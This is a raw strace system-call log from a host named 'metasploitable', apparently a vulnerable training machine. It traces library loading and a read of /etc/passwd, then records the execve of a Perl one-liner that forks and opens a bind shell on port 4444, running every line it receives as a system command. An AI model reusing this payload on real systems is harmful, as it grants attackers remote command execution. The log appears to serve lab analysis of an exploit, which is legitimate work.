\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
9762  07:29:45.321251 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
9762  07:29:45.321279 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d41000
9762  07:29:45.321293 mmap2(0xb7d55000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d55000
9762  07:29:45.321338 mmap2(0xb7d57000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d57000
9762  07:29:45.321370 close(1)          = 0
9762  07:29:45.321413 munmap(0xb7ee7000, 29913) = 0
9762  07:29:45.321430 open("/etc/ld.so.cache", O_RDONLY) = 1
9762  07:29:45.321443 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9762  07:29:45.321459 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee7000
9762  07:29:45.321469 close(1)          = 0
9762  07:29:45.321479 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.321493 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
9762  07:29:45.321507 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9762  07:29:45.321598 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
9762  07:29:45.321616 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d37000
9762  07:29:45.321627 mmap2(0xb7d3f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d3f000
9762  07:29:45.321643 close(1)          = 0
9762  07:29:45.321655 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.321668 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
9762  07:29:45.321682 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9762  07:29:45.321780 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
9762  07:29:45.321827 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d2c000
9762  07:29:45.321839 mmap2(0xb7d35000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d35000
9762  07:29:45.321890 close(1)          = 0
9762  07:29:45.321951 munmap(0xb7ee7000, 29913) = 0
9762  07:29:45.322003 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
9762  07:29:45.322034 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
9762  07:29:45.322045 _llseek(1, 0, [0], SEEK_CUR) = 0
9762  07:29:45.322057 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
9762  07:29:45.322106 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7eee000
9762  07:29:45.322136 _llseek(1, 1624, [1624], SEEK_SET) = 0
9762  07:29:45.322186 munmap(0xb7eee000, 1624) = 0
9762  07:29:45.322210 close(1)          = 0
9762  07:29:45.322304 getpgrp()         = 3831
9762  07:29:45.322343 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
9762  07:29:45.322376 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
9762  07:29:45.322407 brk(0x8101000)    = 0x8101000
9762  07:29:45.322439 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9762  07:29:45.322454 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9762  07:29:45.322503 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9762  07:29:45.322594 brk(0x8102000)    = 0x8102000
9762  07:29:45.322671 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9762  07:29:45.322746 stat64("/sbin/AB", 0xbfe03458) = -1 ENOENT (No such file or directory)
9762  07:29:45.322800 stat64("/bin/AB", 0xbfe03458) = -1 ENOENT (No such file or directory)
9762  07:29:45.322848 stat64("/usr/sbin/AB", 0xbfe03458) = -1 ENOENT (No such file or directory)
9762  07:29:45.322875 stat64("/usr/bin/AB", 0xbfe03458) = -1 ENOENT (No such file or directory)
9762  07:29:45.322903 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
9762  07:29:45.322919 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d626f8) = 9763
9763  07:29:45.322981 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9763  07:29:45.322997 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
9763  07:29:45.323011 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
9763  07:29:45.323040 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
9763  07:29:45.323056 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9763  07:29:45.323099 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
9763  07:29:45.323113 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
9763  07:29:45.323241 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
9763  07:29:45.323319 --- SIGPIPE (Broken pipe) @ 0 (0) ---
9763  07:29:45.323469 exit_group(127)   = ?
9762  07:29:45.348358 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9762  07:29:45.348394 --- SIGCHLD (Child exited) @ 0 (0) ---
9762  07:29:45.348408 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 9763
9762  07:29:45.348424 waitpid(-1, 0xbfe030d8, WNOHANG) = -1 ECHILD (No child processes)
9762  07:29:45.348435 sigreturn()       = ? (mask now [])
9762  07:29:45.348458 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9762  07:29:45.348472 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9762  07:29:45.348483 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9762  07:29:45.348495 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
9762  07:29:45.348512 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9762  07:29:45.348524 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
9762  07:29:45.348557 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9762  07:29:45.348576 stat64("/sbin/perl", 0xbfe03488) = -1 ENOENT (No such file or directory)
9762  07:29:45.348588 stat64("/bin/perl", 0xbfe03488) = -1 ENOENT (No such file or directory)
9762  07:29:45.348600 stat64("/usr/sbin/perl", 0xbfe03488) = -1 ENOENT (No such file or directory)
9762  07:29:45.348611 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
9762  07:29:45.348629 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
9762  07:29:45.348654 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
9762  07:29:45.348668 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d626f8) = 9764
9764  07:29:45.348715 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9764  07:29:45.348731 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
9764  07:29:45.348743 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
9764  07:29:45.348755 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
9764  07:29:45.348770 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9764  07:29:45.348786 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
9764  07:29:45.348798 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
9764  07:29:45.348867 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
9764  07:29:45.349010 brk(0)            = 0x8153000
9764  07:29:45.349031 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9764  07:29:45.349047 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f98000
9764  07:29:45.349062 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9764  07:29:45.349079 open("/etc/ld.so.cache", O_RDONLY) = 1
9764  07:29:45.349092 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9764  07:29:45.349109 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f90000
9764  07:29:45.349119 close(1)          = 0
9764  07:29:45.349130 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9764  07:29:45.349145 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
9764  07:29:45.349160 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
9764  07:29:45.349274 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
9764  07:29:45.349343 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f8c000
9764  07:29:45.349374 mmap2(0xb7f8e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f8e000
9764  07:29:45.349391 close(1)          = 0
9764  07:29:45.349403 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9764  07:29:45.349436 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
9764  07:29:45.349451 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
9764  07:29:45.349537 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
9764  07:29:45.349553 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f67000
9764  07:29:45.349565 mmap2(0xb7f8a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f8a000
9764  07:29:45.349580 close(1)          = 0
9764  07:29:45.349591 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9764  07:29:45.349605 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
9764  07:29:45.349619 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
9764  07:29:45.349709 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
9764  07:29:45.349726 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f66000
9764  07:29:45.349739 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f4e000
9764  07:29:45.349750 mmap2(0xb7f62000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f62000
9764  07:29:45.349764 mmap2(0xb7f64000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f64000
9764  07:29:45.349778 close(1)          = 0
9764  07:29:45.349790 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9764  07:29:45.349832 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
9764  07:29:45.349849 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
9764  07:29:45.349953 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
9764  07:29:45.349970 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dff000
9764  07:29:45.349982 mmap2(0xb7f48000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f48000
9764  07:29:45.349997 mmap2(0xb7f4b000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f4b000
9764  07:29:45.350010 close(1)          = 0
9764  07:29:45.350023 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9764  07:29:45.350036 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
9764  07:29:45.350050 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
9764  07:29:45.350137 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
9764  07:29:45.350153 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dcd000
9764  07:29:45.350164 mmap2(0xb7dd6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dd6000
9764  07:29:45.350182 mmap2(0xb7dd8000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dd8000
9764  07:29:45.350197 close(1)          = 0
9764  07:29:45.350220 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dcc000
9764  07:29:45.350233 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dcc8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
9764  07:29:45.350331 mprotect(0xb7f48000, 4096, PROT_READ) = 0
9764  07:29:45.350376 munmap(0xb7f90000, 29913) = 0
9764  07:29:45.350389 set_tid_address(0xb7dcc908) = 9764
9764  07:29:45.350398 set_robust_list(0xb7dcc910, 0xc) = 0
9764  07:29:45.350407 futex(0xbffa3c40, 0x81 /* FUTEX_??? */, 1) = 0
9764  07:29:45.350422 rt_sigaction(SIGRTMIN, {0xb7f522c0, [], SA_SIGINFO}, NULL, 8) = 0
9764  07:29:45.350435 rt_sigaction(SIGRT_1, {0xb7f52340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
9764  07:29:45.350447 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
9764  07:29:45.350461 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
9764  07:29:45.350480 uname({sys="Linux", node="metasploitable", ...}) = 0
9764  07:29:45.350525 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
9764  07:29:45.350571 brk(0)            = 0x8153000
